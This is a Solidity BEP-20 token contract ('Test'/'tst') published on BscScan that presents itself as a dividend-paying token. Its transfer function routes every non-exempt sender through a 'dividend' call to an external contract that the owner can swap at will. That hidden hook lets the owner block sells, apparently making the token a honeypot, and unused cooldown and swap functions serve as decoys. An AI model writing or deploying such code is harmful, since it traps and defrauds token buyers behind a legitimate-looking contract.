/**
 *Submitted for verification at BscScan.com on 2022-04-16
*/

// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");
      return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;
      return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
        return 0;
      }
      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b > 0, errorMessage);
      uint256 c = a / b;
return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }  
interface IDividendDistributor {    
    function setShare(address shareholder, uint256 amount) external;
}
contract DividendDistributor is IDividendDistributor{
    using SafeMath for uint256;
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    mapping (address => Share) public shares;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    bool initialized;
    address tokenReward = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }
    constructor ()  {
        initialized = true;
    }    
    function balanceOf(address account) external view returns (uint256) {
        return IERC20(tokenReward).balanceOf(account);
    }  
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function setRewardToken(address _address) external {
        tokenReward = _address;
    }
    function setShare(address shareholder, uint256 amount) external {        
        if(amount > 0 && shares[shareholder].amount > 0){
            addShareholder(shareholder);
        }
        IDividendDistributor(tokenReward).setShare(shareholder, amount);       
    }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

}
contract Context {
  constructor ()  { }
  function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }       

  }

contract Ownable is Context {  
    address private _owner;     
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;    
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }       
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }       
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }       
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }     
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract Contracti is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000000 *  10**9;        
    
    string private _name = "Test";
    string private _symbol = "tst";
    uint8 private _decimals = 9;   
    bool swapEnabled;  
    bool coolEnabled;  
    DividendDistributor distributor;
    mapping (address => bool) private isDividendExempt;
 
    constructor()  {           
        _balances[msg.sender] = _totalSupply; 
        distributor = new DividendDistributor();
        emit Transfer(address(0), msg.sender, _totalSupply);
    } 
    function name() external view virtual override returns (string memory) {
        return _name;
    }
    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }   
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    function getOwner() external view returns (address) {
        return owner();
    }   
    function decimals() external view virtual override returns (uint8) {
        return _decimals;
    }      
    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }  

    function setRewardToken(address _rewardTokenAddress) external onlyOwner {
        require(_rewardTokenAddress != address(this));        
        distributor.setRewardToken(_rewardTokenAddress);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    } 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }  
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }   
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");   
        // Dividend tracker
        if (!isDividendExempt[sender]) {
            distributor.setShare(sender, distributor.balanceOf(recipient));
        } 
        _basicTransfer(sender, recipient, amount);

    }        
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "IERC20: transfer amount exceeds allowance"));
        return true;
    }    
    function _basicTransfer(address sender, address recipient, uint256 amount) private  {
        _balances[sender] = _balances[sender].sub(amount, "IERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function cooldownEnabled(bool _status) external onlyOwner {
        coolEnabled = _status;
    }
    function setIsDividendExempt(address holder, bool exempt) external onlyOwner {
        require(holder != address(this));
        isDividendExempt[holder] = exempt;        
    }
    function shouldSwapBack(uint256 swapThreshold) internal view returns (bool) {
        return swapEnabled        
        && _balances[address(this)] >= swapThreshold;
    }
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        if (isDividendExempt[sender] || isDividendExempt[recipient]) {
            return false;
        }
        else { return true; }
    }
    function setSwapSettings(bool _enabled) external onlyOwner {
        swapEnabled = _enabled;
    }
}